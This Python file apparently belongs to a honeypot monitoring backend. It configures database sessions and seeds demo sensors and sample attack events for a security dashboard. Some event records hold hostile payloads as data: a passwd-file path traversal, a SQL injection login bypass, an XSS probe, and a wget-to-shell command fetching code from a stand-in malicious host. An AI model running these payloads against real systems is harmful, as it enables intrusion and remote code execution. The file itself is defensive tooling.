import os
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker, declarative_base, Session
from backend.core.config import settings

# Parse the database URL. For SQLite, make sure parent directories exist.
db_url = settings.DATABASE_URL
if db_url.startswith("sqlite:///"):
    db_path = db_url.replace("sqlite:///", "")
    # Handle absolute vs relative paths
    if db_path and db_path != ":memory:":
        db_dir = os.path.dirname(os.path.abspath(db_path))
        os.makedirs(db_dir, exist_ok=True)

# Configure connection parameters and pool based on database dialect
if "postgresql" in db_url or "postgres" in db_url:
    engine = create_engine(
        db_url,
        pool_size=10,
        max_overflow=20,
        pool_recycle=1800,
        pool_pre_ping=True
    )
else:
    # Fallback/Default to SQLite
    connect_args = {"check_same_thread": False} if db_url.startswith("sqlite") else {}
    engine = create_engine(
        db_url,
        connect_args=connect_args
    )

SessionLocal = sessionmaker(
    autocommit=False,
    autoflush=False,
    bind=engine
)

def get_db():
    """FastAPI dependency for database sessions."""
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

def populate_demo_data(db: Session):
    """Seed initial application settings, sensors, and sample attack events if empty."""
    from backend.models.models import ApplicationSetting, HoneypotSensor, AttackEvent
    from datetime import datetime, timedelta

    # 1. Seed Settings
    if db.query(ApplicationSetting).count() == 0:
        default_settings = [
            ApplicationSetting(key="app_name", value="SentinelAI", type="string"),
            ApplicationSetting(key="app_env", value="development", type="string"),
            ApplicationSetting(key="api_host", value="127.0.0.1", type="string"),
            ApplicationSetting(key="api_port", value="8000", type="int"),
            ApplicationSetting(key="ollama_host", value="http://127.0.0.1:11434", type="string"),
            ApplicationSetting(key="ollama_model", value="llama3.1", type="string"),
            ApplicationSetting(key="retention_days", value="30", type="int"),
            ApplicationSetting(key="collector_interval", value="5", type="int"),
            ApplicationSetting(key="theme", value="cyber-dark", type="string"),
            ApplicationSetting(key="motion_level", value="normal", type="string"),
        ]
        db.add_all(default_settings)
        db.commit()

    # 2. Seed Honeypot Sensors
    if db.query(HoneypotSensor).count() == 0:
        default_sensors = [
            HoneypotSensor(name="HTTP Honeypot", type="HTTP", host="127.0.0.1", port=8080, state="ONLINE", last_heartbeat=datetime.utcnow()),
            HoneypotSensor(name="SSH Listener", type="SSH", host="127.0.0.1", port=2222, state="ONLINE", last_heartbeat=datetime.utcnow()),
            HoneypotSensor(name="FTP Decoy", type="FTP", host="127.0.0.1", port=2121, state="IDLE", last_heartbeat=datetime.utcnow() - timedelta(minutes=10)),
            HoneypotSensor(name="Telnet Port", type="TELNET", host="127.0.0.1", port=2323, state="OFFLINE", last_heartbeat=None),
        ]
        db.add_all(default_sensors)
        db.commit()

    # 3. Seed Sample Attack Events
    if db.query(AttackEvent).count() == 0:
        now = datetime.utcnow()
        sample_attacks = [
            AttackEvent(
                external_id="ATT-001",
                attack_type="Brute Force",
                severity="HIGH",
                status="NEW",
                source_ip="192.168.1.102",
                source_port=54122,
                destination_port=2222,
                protocol="TCP",
                target_service="SSH",
                country="United States",
                city="San Jose",
                payload="Failed login attempt for user 'admin'",
                user_agent="libssh2_1.9.0",
                sensor_id="SSH Listener",
                threat_score=7.8,
                confidence=0.95,
                created_at=now - timedelta(minutes=5)
            ),
            AttackEvent(
                external_id="ATT-002",
                attack_type="Directory Traversal",
                severity="CRITICAL",
                status="NEW",
                source_ip="203.0.113.88",
                source_port=48922,
                destination_port=8080,
                protocol="TCP",
                target_service="HTTP",
                country="Romania",
                city="Bucharest",
                payload="GET /../../../../etc/passwd HTTP/1.1",
                user_agent="Mozilla/5.0 (compatible; Nmap Scripting Engine)",
                sensor_id="HTTP Honeypot",
                threat_score=9.5,
                confidence=0.98,
                created_at=now - timedelta(minutes=15)
            ),
            AttackEvent(
                external_id="ATT-003",
                attack_type="Port Scan",
                severity="MEDIUM",
                status="ASSIGNED",
                source_ip="10.0.0.55",
                source_port=1244,
                destination_port=2121,
                protocol="TCP",
                target_service="FTP",
                country="Unknown",
                city="Unknown",
                payload="SYN scan packet",
                user_agent="nmap",
                sensor_id="FTP Decoy",
                threat_score=4.5,
                confidence=0.90,
                created_at=now - timedelta(hours=1)
            ),
            AttackEvent(
                external_id="ATT-004",
                attack_type="SQL Injection",
                severity="CRITICAL",
                status="NEW",
                source_ip="198.51.100.12",
                source_port=60111,
                destination_port=8080,
                protocol="TCP",
                target_service="HTTP",
                country="China",
                city="Beijing",
                payload="POST /api/login HTTP/1.1\nHost: local\n\nusername=admin' OR '1'='1",
                user_agent="sqlmap/1.5",
                sensor_id="HTTP Honeypot",
                threat_score=9.2,
                confidence=0.97,
                created_at=now - timedelta(hours=2)
            ),
            AttackEvent(
                external_id="ATT-005",
                attack_type="Unauthorized Connection",
                severity="LOW",
                status="RESOLVED",
                source_ip="172.16.4.19",
                source_port=33042,
                destination_port=2323,
                protocol="TCP",
                target_service="TELNET",
                country="Local Network",
                city="Local",
                payload="Telnet initial handshake bytes",
                user_agent="Putty",
                sensor_id="Telnet Port",
                threat_score=2.1,
                confidence=0.85,
                created_at=now - timedelta(hours=5)
            ),
            AttackEvent(
                external_id="ATT-006",
                attack_type="XSS Probe",
                severity="MEDIUM",
                status="IGNORED",
                source_ip="185.220.101.44",
                source_port=44922,
                destination_port=8080,
                protocol="TCP",
                target_service="HTTP",
                country="Germany",
                city="Berlin",
                payload="GET /search?q=<script>alert(1)</script> HTTP/1.1",
                user_agent="Mozilla/5.0 Tor Browser",
                sensor_id="HTTP Honeypot",
                threat_score=5.0,
                confidence=0.92,
                created_at=now - timedelta(hours=12)
            ),
            AttackEvent(
                external_id="ATT-007",
                attack_type="SSH Command Infiltration",
                severity="HIGH",
                status="NEW",
                source_ip="85.203.15.6",
                source_port=59021,
                destination_port=2222,
                protocol="TCP",
                target_service="SSH",
                country="Russia",
                city="Moscow",
                payload="SSH command execution: 'wget http://malicious.ru/payload -O - | sh'",
                user_agent="OpenSSH_8.2p1",
                sensor_id="SSH Listener",
                threat_score=8.5,
                confidence=0.96,
                created_at=now - timedelta(hours=20)
            )
        ]
        db.add_all(sample_attacks)
        db.commit()
